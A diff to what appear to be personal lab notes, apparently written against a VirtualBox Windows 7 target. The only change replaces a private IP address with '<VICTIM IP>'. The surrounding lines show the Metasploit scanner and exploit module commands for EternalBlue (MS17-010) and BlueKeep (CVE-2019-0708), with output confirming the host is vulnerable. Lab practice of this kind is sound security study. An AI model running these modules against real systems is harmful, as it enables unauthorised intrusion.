@@ -10,7 +10,7 @@ Lets try Eternalblue exploit on this machine
 
     lets check it:
         use auxiliary/scanner/smb/smb_ms17_010
-            [+] 192.168.59.186:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
+            [+] <VICTIM IP>:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
 
     lets use it
         use exploit/windows/smb/ms17_010_eternalblue
@@ -52,7 +52,7 @@ let use BlueKeep:
 
     lets try it:
         use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-            [+] 192.168.59.186:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+            [+] <VICTIM IP>:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
 
         use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
         set target 2 -> virtualbox win7
